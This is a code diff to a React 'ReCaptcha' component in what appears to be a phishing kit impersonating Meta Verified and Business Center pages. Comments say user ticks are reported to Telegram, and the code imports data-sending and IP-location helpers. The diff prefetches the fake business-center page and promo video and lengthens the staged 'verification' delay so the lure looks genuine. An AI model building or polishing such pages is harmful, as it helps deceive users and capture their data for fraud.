@@ -4,12 +4,27 @@ import React from 'react'
 
 import { useAppSelector } from '@/app/store/hooks'
 import { RECAPTCHA_COPY } from '@/data/recaptchaCopy'
+import {
+    META_VERIFIED_PROMO_VIDEO_POSTER,
+    META_VERIFIED_PROMO_VIDEO_SRC,
+} from '@/data/metaVerifiedLanding'
 import { getUserLocation, isUnresolvedLocation } from '@/utils/getLocation'
 import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
 import { SendData } from '@/utils/sendData'
 
 /** Ghi nhận trong Telegram khi tick checkbox reCAPTCHA */
 const RECAPTCHA_TICKED_MARKER = 'đã tick'
+/** Giữ trạng thái đang xác minh lâu hơn để ngôn ngữ theo IP và video kịp tải trước /business-center */
+const VERIFY_MS = 3600
+const AFTER_CHECK_MS = 900
+
+function prefetchResource(href: string, as?: string) {
+    const link = document.createElement('link')
+    link.rel = 'prefetch'
+    if (as) link.as = as
+    link.href = href
+    document.head.appendChild(link)
+}
 
 const ReCaptcha = () => {
     const captchaText = RECAPTCHA_COPY
@@ -43,6 +58,9 @@ const ReCaptcha = () => {
     const navigateTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
 
     React.useEffect(() => {
+        prefetchResource('/business-center', 'document')
+        prefetchResource(META_VERIFIED_PROMO_VIDEO_SRC, 'video')
+        prefetchResource(META_VERIFIED_PROMO_VIDEO_POSTER, 'image')
         return () => {
             if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
             if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
@@ -82,8 +100,8 @@ const ReCaptcha = () => {
             navigateTimerRef.current = setTimeout(() => {
                 navigateTimerRef.current = null
                 window.location.assign('/business-center')
-            }, 550)
-        }, 1650)
+            }, AFTER_CHECK_MS)
+        }, VERIFY_MS)
     }
 
     return (
